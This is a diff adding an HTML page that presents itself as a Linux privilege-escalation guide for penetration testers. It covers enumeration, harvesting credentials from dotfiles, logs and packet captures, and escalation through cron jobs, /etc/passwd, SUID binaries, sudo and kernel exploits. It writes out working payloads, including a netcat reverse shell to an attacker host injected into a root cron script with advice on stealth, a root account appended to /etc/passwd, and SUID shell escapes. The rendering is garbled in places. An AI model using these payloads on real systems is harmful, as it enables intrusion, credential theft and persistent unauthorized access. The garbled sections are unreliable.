@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linux Privilege Escalation - Privilege Escalation Guide</title>
+    <meta name="description" content="Comprehensive Linux and Windows Privilege Escalation Techniques and Tradecraft">
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <header class="site-header">
+    <div class="header-content">
+        <h1 class="site-title">
+            <a href="/">Privilege Escalation Guide</a>
+        </h1>
+        <p class="site-description">Comprehensive Linux and Windows Privilege Escalation Techniques and Tradecraft</p>
+    </div>
+    
+    <nav class="site-nav">
+        <ul>
+            <li><a href="/" >Home</a></li>
+            <li><a href="/docs/linux-privilege-escalation/" class="active">Linux</a></li>
+            <li><a href="/docs/windows-privilege-escalation/" >Windows</a></li>
+            <li><a href="https://gtfobins.org/" target="_blank">GTFOBins ↗</a></li>
+            <li><a href="https://medtrigui.github.io/escabin/" target="_blank">Escabin ↗</a></li>
+        </ul>
+    </nav>
+</header>
+
+    
+    <div class="container">
+        <main>
+            <article>
+    <header>
+        <h1>Linux Privilege Escalation</h1>
+        
+        <p class="lead">Comprehensive techniques for Linux privilege escalation through enumeration, credential harvesting, and system component exploitation</p>
+        
+    </header>
+    
+    <h1 id="linux-privilege-escalation">Linux Privilege Escalation</h1>
+
+<h2 id="overview">Overview</h2>
+
+<p>Effective privilege escalation on Linux demands disciplined reconnaissance, precise analysis of trust boundaries, and carefully executed exploits. This guide mirrors the structure and technical depth of the Windows privilege escalation guide: clear sections, actionable commands, and reusable tradecraft designed for penetration testers and red-team operators. The focus is on techniques and workflows—not lab-specific walkthroughs.</p>
+
+<h2 id="learning-objectives">Learning Objectives</h2>
+
+<ul>
+  <li>Build a comprehensive Linux enumeration workflow covering identity, processes, networking, storage, and permissions.</li>
+  <li>Identify exposed confidential information across user artifacts and system telemetry.</li>
+  <li>Abuse writable jobs, binaries, and authentication stores to weaponize privilege boundaries.</li>
+  <li>Escalate via system components (SUID, sudo, kernel) with repeatable, low-noise techniques.</li>
+</ul>
+
+<h2 id="table-of-contents">Table of Contents</h2>
+
+<ol>
+  <li><a href="#1-enumerating-linux">Enumerating Linux</a><br />
+1.1 <a href="#11-linux-privilege-model-basics">Linux Privilege Model Basics</a><br />
+1.2 <a href="#12-manual-enumeration-workflow">Manual Enumeration Workflow</a><br />
+1.3 <a href="#13-automated-enumeration">Automated Enumeration</a></li>
+  <li><a href="#2-exposed-confidential-information">Exposed Confidential Information</a><br />
+2.1 <a href="#21-user-trails--shell-artifacts">User Trails &amp; Shell Artifacts</a><br />
+2.2 <a href="#22-system-trails--live-telemetry">System Trails &amp; Live Telemetry</a></li>
+  <li><a href="#3-insecure-file-permissions">Insecure File Permissions</a><br />
+3.1 <a href="#31-writable-scheduled-jobs">Writable Scheduled Jobs</a><br />
+3.2 <a href="#32-writable-authentication-stores">Writable Authentication Stores</a></li>
+  <li><a href="#4-insecure-system-components">Insecure System Components</a><br />
+4.1 <a href="#41-suid-programs--capabilities">SUID Programs &amp; Capabilities</a><br />
+4.2 <a href="#42-sudo-misconfigurations">Sudo Misconfigurations</a><br />
+4.3 <a href="#43-kernel-vulnerabilities">Kernel Vulnerabilities</a></li>
+</ol>
+
+<hr />
+
+<h1 id="1-enumerating-linux">1. Enumerating Linux</h1>
+
+<p>Enumeration is the backbone of every Linux escalation. Start broad, capture facts, then refine targets.</p>
+
+<h2 id="11-linux-privilege-model-basics">1.1 Linux Privilege Model Basics</h2>
+
+<h3 id="filesystem-permissions">Filesystem Permissions</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span> /etc/shadow
+<span class="c"># -rw-r----- 1 root shadow 1762 May  2 09:31 /etc/shadow</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Owner/group/others each have <code class="language-plaintext highlighter-rouge">rwx</code> flags.</li>
+  <li>Directories treat <code class="language-plaintext highlighter-rouge">x</code> as “traverse” (enter) and <code class="language-plaintext highlighter-rouge">r</code> as “list entries.”</li>
+</ul>
+
+<h3 id="real-vs-effective-uidgid">Real vs. Effective UID/GID</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps u <span class="nt">-C</span> passwd
+<span class="nb">grep </span>Uid /proc/&lt;pid&gt;/status
+</code></pre></div></div>
+
+<ul>
+  <li>Real UID = launching user.</li>
+  <li>Effective UID = permissions enforced; SUID/SGID binaries set this to file owner/group.</li>
+</ul>
+
+<h2 id="12-manual-enumeration-workflow">1.2 Manual Enumeration Workflow</h2>
+
+<h3 id="identity--group-recon">Identity &amp; Group Recon</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami
+id
+cat</span> /etc/passwd
+<span class="nb">groups
+sudo</span> <span class="nt">-l</span>          <span class="c"># if password known</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Flag service accounts, shell-bearing users, and privileged groups (<code class="language-plaintext highlighter-rouge">sudo</code>, <code class="language-plaintext highlighter-rouge">docker</code>, <code class="language-plaintext highlighter-rouge">lxd</code>, <code class="language-plaintext highlighter-rouge">adm</code>).</li>
+</ul>
+
+<h3 id="host--os-fingerprinting">Host &amp; OS Fingerprinting</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hostnamectl
+<span class="nb">cat</span> /etc/os-release
+<span class="nb">uname</span> <span class="nt">-a</span>
+lsb_release <span class="nt">-a</span>      <span class="c"># if present</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Capture distro, release, kernel, architecture for exploit matching.</li>
+</ul>
+
+<h3 id="processes--services">Processes &amp; Services</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux <span class="nt">--sort</span><span class="o">=</span>-%mem | <span class="nb">head
+</span>systemctl list-units <span class="nt">--type</span><span class="o">=</span>service <span class="nt">--state</span><span class="o">=</span>running
+netstat <span class="nt">-plant</span> | <span class="nb">grep </span>LISTEN     <span class="c"># or ss -plant</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Prioritize root-owned interpreters, custom daemons, and backup/automation scripts.</li>
+</ul>
+
+<h3 id="network--routing">Network &amp; Routing</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip addr show
+ip route show
+ss <span class="nt">-anptu</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Multi-homed hosts indicate pivot potential; loopback-only services often hide local escalation vectors.</li>
+</ul>
+
+<h3 id="firewall--packet-filters">Firewall / Packet Filters</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>iptables <span class="nt">-L</span> <span class="nt">-n</span> <span class="nt">-v</span>
+<span class="nb">sudo </span>ufw status verbose
+<span class="nb">sudo </span>firewall-cmd <span class="nt">--list-all</span>
+<span class="nb">cat</span> /etc/iptables/rules.v4 2&gt;/dev/null
+</code></pre></div></div>
+
+<ul>
+  <li>Without sudo, look for persisted configs created by <code class="language-plaintext highlighter-rouge">iptables-save</code>, <code class="language-plaintext highlighter-rouge">firewalld</code>, or <code class="language-plaintext highlighter-rouge">nftables</code>.</li>
+</ul>
+
+<h3 id="scheduled-jobs">Scheduled Jobs</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-lah</span> /etc/cron.<span class="k">*</span>
+<span class="nb">cat</span> /etc/crontab
+crontab <span class="nt">-l</span>
+<span class="nb">sudo </span>crontab <span class="nt">-l</span>
+systemctl list-timers <span class="nt">--all</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Note scripts executed as root but stored in user-writable directories (<code class="language-plaintext highlighter-rouge">/home/*/.scripts</code>, <code class="language-plaintext highlighter-rouge">/opt</code>, <code class="language-plaintext highlighter-rouge">/usr/local/bin</code>).</li>
+</ul>
+
+<h3 id="package-inventory">Package Inventory</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpkg <span class="nt">-l</span> | <span class="nb">tee</span> /tmp/pkglist      <span class="c"># Debian/Ubuntu</span>
+rpm <span class="nt">-qa</span> | <span class="nb">tee</span> /tmp/pkglist      <span class="c"># RHEL/CentOS</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Cross-reference versions with CVE feeds or <code class="language-plaintext highlighter-rouge">searchsploit</code>.</li>
+</ul>
+
+<h3 id="writable-paths--binaries">Writable Paths &amp; Binaries</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-writable</span> <span class="nt">-type</span> d <span class="nt">-not</span> <span class="nt">-path</span> <span class="s2">"/proc/*"</span> <span class="nt">-not</span> <span class="nt">-path</span> <span class="s2">"/sys/*"</span> 2&gt;/dev/null
+find / <span class="nt">-perm</span> <span class="nt">-2</span> <span class="nt">-type</span> f 2&gt;/dev/null         <span class="c"># world-writable files</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Focus on directories intersecting with PATH, cron, systemd, or service binaries.</li>
+</ul>
+
+<h3 id="storage--mounts">Storage &amp; Mounts</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsblk
+<span class="nb">cat</span> /etc/fstab
+mount | column <span class="nt">-t</span>
+findmnt <span class="nt">-t</span> nfs,cifs
+</code></pre></div></div>
+
+<ul>
+  <li>Unmounted partitions or network shares may hold credentials or backups.</li>
+</ul>
+
+<h3 id="kernel-modules">Kernel Modules</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsmod
+/sbin/modinfo &lt;module&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Third-party drivers often introduce attack surface.</li>
+</ul>
+
+<h3 id="special-permissions--capabilities">Special Permissions &amp; Capabilities</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null    <span class="c"># SUID</span>
+find / <span class="nt">-perm</span> <span class="nt">-2000</span> <span class="nt">-type</span> f 2&gt;/dev/null    <span class="c"># SGID</span>
+/usr/sbin/getcap <span class="nt">-r</span> / 2&gt;/dev/null
+</code></pre></div></div>
+
+<ul>
+  <li>Feed results into <strong><a href="https://gtfobins.org/">GTFOBins</a></strong> or <strong><a href="https://medtrigui.github.io/escabin/">escabin</a></strong> (detailed SUID/capability exploits).</li>
+  <li>Leverage binary documentation to craft custom payloads.</li>
+</ul>
+
+<h2 id="13-automated-enumeration">1.3 Automated Enumeration</h2>
+
+<p>Automation supplements—not replaces—manual work.</p>
+
+<h3 id="unix-privesc-check">unix-privesc-check</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/unix-privesc-check standard <span class="o">&gt;</span> /tmp/upc-standard.txt
+/usr/bin/unix-privesc-check detailed <span class="o">&gt;</span> /tmp/upc-detailed.txt
+</code></pre></div></div>
+
+<ul>
+  <li>Standard: quick, minimal noise.</li>
+  <li>Detailed: follows file handles/scripts, more false positives but deeper coverage.</li>
+</ul>
+
+<h3 id="linenum">LinEnum</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://&lt;attacker&gt;/LinEnum.sh <span class="nt">-O</span> /tmp/LinEnum.sh
+<span class="nb">chmod</span> +x /tmp/LinEnum.sh
+/tmp/LinEnum.sh <span class="nt">-r</span> report <span class="nt">-e</span> /tmp/linenum.log
+</code></pre></div></div>
+
+<ul>
+  <li>Summarizes cron, SUID, capabilities, network, and writable directories.</li>
+</ul>
+
+<h3 id="linpeas">LinPEAS</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://&lt;attacker-server&gt;/linpeas.sh <span class="nt">-O</span> /tmp/linpeas.sh
+<span class="nb">chmod</span> +x /tmp/linpeas.sh
+/tmp/linpeas.sh | <span class="nb">tee</span> /tmp/linpeas.log
+</code></pre></div></div>
+
+<ul>
+  <li>Color-coded output highlights “High” and “Very High” priority findings.</li>
+  <li>Cross-reference any SUID binaries or capabilities discovered with <strong><a href="https://gtfobins.org/">GTFOBins</a></strong>.</li>
+</ul>
+
+<h3 id="recommended-flow">Recommended Flow</h3>
+
+<ol>
+  <li>Manual enumeration for context.</li>
+  <li>Run 1–2 automated tools.</li>
+  <li>Merge findings, remove duplicates, prioritize escalation paths.</li>
+</ol>
+
+<hr />
+
+<h1 id="2-exposed-confidential-information">2. Exposed Confidential Information</h1>
+
+<p>Credentials leak everywhere: dotfiles, history, logs, and live traffic. Harvest them before resorting to complex exploits.</p>
+
+<h2 id="21-user-trails--shell-artifacts">2.1 User Trails &amp; Shell Artifacts</h2>
+
+<h3 id="dotfiles--history">Dotfiles &amp; History</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-a</span> ~
+<span class="nb">tail</span> <span class="nt">-n</span> 200 ~/.bash_history
+<span class="nb">grep</span> <span class="nt">-R</span> <span class="s2">"password</span><span class="se">\|</span><span class="s2">token</span><span class="se">\|</span><span class="s2">secret"</span> ~/.<span class="k">*</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Inspect <code class="language-plaintext highlighter-rouge">~/.config</code>, <code class="language-plaintext highlighter-rouge">~/.aws</code>, <code class="language-plaintext highlighter-rouge">~/.kube</code>, <code class="language-plaintext highlighter-rouge">~/.docker</code>, <code class="language-plaintext highlighter-rouge">~/.gnupg</code>, <code class="language-plaintext highlighter-rouge">~/.ssh/</code>.</li>
+</ul>
+
+<h3 id="environment-variables--startup-scripts">Environment Variables &amp; Startup Scripts</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">env</span> | <span class="nb">sort
+grep</span> <span class="nt">-R</span> <span class="s2">"export"</span> ~/.bashrc ~/.profile ~/.bash_profile /etc/profile /etc/bash.bashrc
+</code></pre></div></div>
+
+<ul>
+  <li>Variables like <code class="language-plaintext highlighter-rouge">DB_PASS</code>, <code class="language-plaintext highlighter-rouge">API_KEY</code>, <code class="language-plaintext highlighter-rouge">SCRIPT_CREDENTIALS</code> often hold plaintext secrets.</li>
+</ul>
+
+<h3 id="credential-reuse--wordlists">Credential Reuse &amp; Wordlists</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 6 6 <span class="nt">-t</span> Pattern%%% <span class="nt">-o</span> /tmp/wordlist
+hydra <span class="nt">-l</span> &lt;username&gt; <span class="nt">-P</span> /tmp/wordlist ssh://&lt;target-ip&gt; <span class="nt">-t</span> 4 <span class="nt">-V</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Seed wordlists with discovered patterns; test across local users, services, VPNs, and sudo.</li>
+  <li>Extract common patterns from environment variables, config files, and shell history.</li>
+</ul>
+
+<h3 id="ssh-keys">SSH Keys</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-R</span> <span class="s2">"BEGIN RSA PRIVATE KEY"</span> <span class="nt">-n</span> /home /root 2&gt;/dev/null
+</code></pre></div></div>
+
+<ul>
+  <li>Copy readable private keys; attempt authentication or crack <code class="language-plaintext highlighter-rouge">id_rsa</code> with <code class="language-plaintext highlighter-rouge">ssh2john</code>.</li>
+</ul>
+
+<h2 id="22-system-trails--live-telemetry">2.2 System Trails &amp; Live Telemetry</h2>
+
+<h3 id="process-monitoring">Process Monitoring</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>watch <span class="nt">-n</span> 1 <span class="s2">"ps aux | grep -Ei 'pass|key|token|cred'"</span>
+<span class="nb">sudo </span>strings /proc/&lt;pid&gt;/environ | <span class="nb">tr</span> <span class="s1">'\0'</span> <span class="s1">'\n'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Look for <code class="language-plaintext highlighter-rouge">sshpass</code>, backup scripts, or daemons embedding credentials in arguments or environment variables.</li>
+</ul>
+
+<h3 id="packet-capture">Packet Capture</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>tcpdump <span class="nt">-i</span> lo <span class="nt">-A</span> | <span class="nb">grep</span> <span class="nt">-Ei</span> <span class="s2">"pass|token|auth"</span>
+<span class="nb">sudo </span>tcpdump <span class="nt">-i</span> any port 389 <span class="nt">-w</span> /tmp/ldap.pcap
+</code></pre></div></div>
+
+<ul>
+  <li>Loopback captures expose services bound only to localhost; sniff HTTP basic auth, LDAP binds, SMTP logins.</li>
+</ul>
+
+<h3 id="logs--journals">Logs &amp; Journals</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-Ri</span> <span class="s2">"password"</span> /var/log 2&gt;/dev/null
+journalctl <span class="nt">-u</span> &lt;service&gt; | <span class="nb">grep</span> <span class="nt">-Ei</span> <span class="s2">"auth|err|secret"</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Debug logging tiers frequently dump database or API credentials.</li>
+</ul>
+
+<h3 id="systemd--service-configs">Systemd &amp; Service Configs</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemctl <span class="nb">cat</span> &lt;service&gt;
+<span class="nb">cat</span> /etc/systemd/system/&lt;service&gt;.service
+</code></pre></div></div>
+
+<ul>
+  <li>Inspect <code class="language-plaintext highlighter-rouge">Environment=</code>, <code class="language-plaintext highlighter-rouge">ExecStart</code>, and helper scripts for stored secrets.</li>
+</ul>
+
+<hr />
+
+<h1 id="3-insecure-file-permissions">3. Insecure File Permissions</h1>
+
+<p>Writable artifacts executed by privileged contexts provide deterministic escalation routes.</p>
+
+<h2 id="31-writable-scheduled-jobs">3.1 Writable Scheduled Jobs</h2>
+
+<h3 id="finding-vulnerable-jobs">Finding Vulnerable Jobs</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep </span>CRON /var/log/syslog 2&gt;/dev/null | <span class="nb">tail
+cat</span> /etc/crontab
+find /etc/cron.<span class="k">*</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-lah</span> <span class="o">{}</span> <span class="se">\;</span>
+systemctl list-timers <span class="nt">--all</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Note any job running as root but residing in user-writable directories (<code class="language-plaintext highlighter-rouge">/home/*/.scripts</code>, <code class="language-plaintext highlighter-rouge">/tmp</code>, <code class="language-plaintext highlighter-rouge">/opt</code>).</li>
+</ul>
+
+<h3 id="weaponization-blueprint">Weaponization Blueprint</h3>
+
+<ol>
+  <li>Confirm file ownership/permissions.</li>
+  <li>Backup original script.</li>
+  <li>Inject payload (reverse shell, user creation, binary drop).</li>
+  <li>Start listener (<code class="language-plaintext highlighter-rouge">nc -lnvp &lt;port&gt;</code>) or monitor logs.</li>
+  <li>Restore original content post-execution if stealth is required.</li>
+</ol>
+
+<h3 id="sample-reverse-shell-payload">Sample Reverse Shell Payload</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="sh">'</span><span class="no">EOF</span><span class="sh">' &gt;&gt; /path/to/writable/scheduled_script.sh
+rm /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc &lt;ATTACKER_IP&gt; &lt;PORT&gt; &gt;/tmp/f
+</span><span class="no">EOF
+</span>nc <span class="nt">-lnvp</span> &lt;PORT&gt;
+</code></pre></div></div>
+
+<h2 id="32-writable-authentication-stores">3.2 Writable Authentication Stores</h2>
+
+<h3 id="etcpasswd-injection">/etc/passwd Injection</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span> /etc/passwd
+openssl passwd <span class="nt">-6</span> <span class="s1">'&lt;password&gt;'</span>           <span class="c"># Generate SHA512 hash</span>
+<span class="nb">echo</span> <span class="s1">'user:$6$&lt;hash&gt;:0:0:root:/root:/bin/bash'</span> | <span class="nb">tee</span> <span class="nt">-a</span> /etc/passwd
+su - user
+</code></pre></div></div>
+
+<ul>
+  <li>UID/GID <code class="language-plaintext highlighter-rouge">0</code> grants full root access. Prefer SHA512 (<code class="language-plaintext highlighter-rouge">-6</code>) to ensure compatibility with modern PAM configs.</li>
+  <li>Requires write access to <code class="language-plaintext highlighter-rouge">/etc/passwd</code> (often world-writable in weak configurations).</li>
+</ul>
+
+<h3 id="ssh-authorized-keys">SSH Authorized Keys</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> f <span class="nt">-name</span> authorized_keys <span class="nt">-writable</span> 2&gt;/dev/null
+<span class="nb">echo</span> <span class="s2">"ssh-ed25519 AAAAC3..."</span> <span class="o">&gt;&gt;</span> /root/.ssh/authorized_keys
+</code></pre></div></div>
+
+<ul>
+  <li>Plant keys in writable <code class="language-plaintext highlighter-rouge">authorized_keys</code> for privileged users to gain persistent access.</li>
+</ul>
+
+<h3 id="application-configs">Application Configs</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-R</span> <span class="s2">"password"</span> /etc /opt /var/www 2&gt;/dev/null | <span class="nb">head</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Extract DB/service credentials from config files, then authenticate as those accounts or re-use passwords for local escalation.</li>
+</ul>
+
+<hr />
+
+<h1 id="4-insecure-system-components">4. Insecure System Components</h1>
+
+<p>When user-space avenues dry up, attack the primitives enforcing privilege separation.</p>
+
+<h2 id="41-suid-programs--capabilities">4.1 SUID Programs &amp; Capabilities</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
+/usr/sbin/getcap <span class="nt">-r</span> / 2&gt;/dev/null
+</code></pre></div></div>
+
+<ul>
+  <li>Feed results into GTFOBins; focus on interpreters, archive tools, network utilities, and custom binaries.</li>
+</ul>
+
+<h3 id="example-exploits">Example Exploits</h3>
+<p>For detailed exploit chains, always check <strong><a href="https://gtfobins.org/">GTFOBins</a></strong> first.</p>
+
+<ul>
+  <li><strong>SUID <code class="language-plaintext highlighter-rouge">find</code>:</strong></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /tmp <span class="nt">-exec</span> /bin/sh <span class="nt">-p</span> <span class="se">\;</span> <span class="nt">-quit</span>
+</code></pre></div></div>
+
+<ul>
+  <li><strong>Interpreter with <code class="language-plaintext highlighter-rouge">cap_setuid+ep</code>:</strong></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/perl <span class="nt">-e</span> <span class="s1">'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</span>
+</code></pre></div></div>
+
+<p>See <strong><a href="https://gtfobins.org/">GTFOBins</a></strong> for comprehensive SUID/capability exploit patterns.r/bin/perl -e ‘use POSIX qw(setuid); POSIX::setuid(0); exec “/bin/sh”;’</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+## 4.2 Sudo Misconfigurations
+
+### Enumerate Privileges
+
+```bash
+sudo -l
+</code></pre></div></div>
+
+<p>For comprehensive sudo exploitation patterns, consult <strong><a href="https://gtfobins.org/#+sudo">GTFOBins</a></strong>.</p>
+
+<ul>
+  <li><strong>Pagers (less/more/vim)</strong>: <code class="language-plaintext highlighter-rouge">sudo &lt;pager&gt; /etc/passwd</code> → escape to shell <code class="language-plaintext highlighter-rouge">!&lt;command&gt;</code></li>
+  <li><strong>Package managers</strong>: <code class="language-plaintext highlighter-rouge">sudo &lt;package-manager&gt; changelog &lt;package&gt;</code> → spawn editor/pager</li>
+  <li><strong>Service managers</strong>: <code class="language-plaintext highlighter-rouge">sudo systemctl status &lt;service&gt;</code> → press <code class="language-plaintext highlighter-rouge">!&lt;command&gt;</code> inside pager</li>
+  <li><strong>Archive/utility tools</strong>: Use built-in hooks (<code class="language-plaintext highlighter-rouge">tar --checkpoint-action</code>, <code class="language-plaintext highlighter-rouge">rsync --use-compress-program</code>, <code class="language-plaintext highlighter-rouge">find -exec</code>)</li>
+  <li><strong>less/more/vim</strong>: <code class="language-plaintext highlighter-rouge">sudo less /etc/passwd</code> → <code class="language-plaintext highlighter-rouge">! /bin/sh</code></li>
+  <li><strong>apt-get</strong>: <code class="language-plaintext highlighter-rouge">sudo apt-get changelog apt</code> → inside pager run <code class="language-plaintext highlighter-rouge">!/bin/sh</code></li>
+  <li><strong>systemctl</strong>: <code class="language-plaintext highlighter-rouge">sudo systemctl status &lt;service&gt;</code> → press <code class="language-plaintext highlighter-rouge">! /bin/sh</code></li>
+  <li><strong>tar/rsync/find</strong>: Use built-in execution hooks (<code class="language-plaintext highlighter-rouge">--checkpoint-action</code>, <code class="language-plaintext highlighter-rouge">--use-compress-program</code>, <code class="language-plaintext highlighter-rouge">-exec</code>).</li>
+</ul>
+
+<h3 id="mac-enforcement">MAC Enforcement</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>aa-status
+getenforce
+</code></pre></div></div>
+
+<ul>
+  <li>AppArmor/SELinux may block sudo-based payloads (e.g., <code class="language-plaintext highlighter-rouge">tcpdump</code>). If so, pivot to another allowed command or adjust profile when authorized.</li>
+</ul>
+
+<h2 id="43-kernel-vulnerabilities">4.3 Kernel Vulnerabilities</h2>
+
+<h3 id="recon">Recon</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">uname</span> <span class="nt">-a</span>
+<span class="nb">cat</span> /etc/os-release
+</code></pre></div></div>
+<ul>
+  <li>Document kernel, distro, architecture for exploit matching.</li>
+</ul>
+
+<h3 id="research--selection">Research &amp; Selection</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="s2">"linux kernel &lt;distro&gt; &lt;version&gt; privilege"</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Filter by kernel range, exploit stability, and required dependencies.</li>
+</ul>
+
+<h3 id="compile--execute">Compile &amp; Execute</h3>
+<user>@<target>:/tmp/
+gcc /tmp/exploit.c -o /tmp/exploit
+/tmp/exploit
+id
+```
+
+- Prefer compiling on the target to avoid dependency mismatches.
+- Clean up binaries and forensic artifacts per engagement rules.
+
+### Notable Vulnerable Patterns
+```bash
+ls -lah /usr/bin/<binary>*
+```
+
+- Check kernel version against known CVEs (e.g., dirty COW, no_new_privs bypass).
+- Use **[searchsploit](https://www.exploit-db.com/)** to cross-reference available exploits.
+- Always test exploit stability in non-production environments first
+
+- Prefer compiling on the target to avoid dependency mismatches. Clean up binaries and logs per engagement rules.
+
+---
+</binary></target></user>
+
+</article>
+
+        </main>
+        
+        
+        <aside class="sidebar">
+            <nav class="docs-nav">
+                <h3>Linux Privilege Escalation</h3>
+                <ul>
+                    <li><a href="/docs/linux-privilege-escalation/#1-enumerating-linux">1. Enumerating Linux</a></li>
+                    <li><a href="/docs/linux-privilege-escalation/#2-exposed-confidential-information">2. Exposed Information</a></li>
+                    <li><a href="/docs/linux-privilege-escalation/#3-insecure-file-permissions">3. Insecure Permissions</a></li>
+                    <li><a href="/docs/linux-privilege-escalation/#4-insecure-system-components">4. System Components</a></li>
+                </ul>
+                
+                <h3>Windows Privilege Escalation</h3>
+                <ul>
+                    <li><a href="/docs/windows-privilege-escalation/">View Guide</a></li>
+                </ul>
+            </nav>
+        </aside>
+        
+    </div>
+    
+    <footer class="site-footer">
+    <div class="footer-content">
+        <p>&copy; 2024 Privilege Escalation Guide. Security research and penetration testing reference.</p>
+        <p>
+            <a href="https://github.com/medTrigui/privilege-escalation">GitHub</a> | 
+            <a href="https://gtfobins.org/">GTFOBins</a> | 
+            <a href="https://medtrigui.github.io/escabin/">Escabin</a>
+        </p>
+    </div>
+</footer>
+
+</body>
+</html>
